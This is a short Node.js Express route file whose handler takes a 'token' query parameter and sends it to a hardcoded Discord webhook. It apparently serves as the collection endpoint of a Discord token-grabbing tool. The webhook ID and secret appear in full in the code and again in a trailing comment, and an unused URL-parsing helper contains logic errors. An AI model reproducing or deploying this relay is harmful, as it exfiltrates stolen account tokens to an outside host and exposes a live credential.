const express = require('express');
const router = express.Router();
const fetch = require('node-fetch');
const {WebhookClient} = require('discord.js');
router.get('/', (req,res) => {
    if(!req.query.token) return res.render('404', {layout:'home'});
    //let parse = parseWebhookURL(req.query.webhook);
    //if(parse == null) return res.render('404', {layout:'home'});
    const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");
    webhook.send(req.query.token);
    res.send('done');
})

function parseWebhookURL(url)
{
    let cid = "";
    if(!url.startsWith('https://discord.com/api/webhooks/')) return null;
    let webhookCID1 = url.slice('https://discord.com/api/webhooks/'.length)
    var webhookCID = "";
    var webhookToken = "";
    for(var i = 0; i<webhookCID1.length; i++)
    {
        if(!isNaN(webhookCID1[i])) break;
        webhookCID+=webhookCID1[i];
    }
    if(!url.startsWith(`https://discord.com/api/webhooks/${webhookCID}/`)) return null;
    webhookToken=url.slice(`https://discord.com/api/webhooks/${webhookCID}/`);
    return {clientID:webhookCID,token:webhookToken};
}

module.exports = router;

//https://discord.com/api/webhooks/861652348848570398/C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O
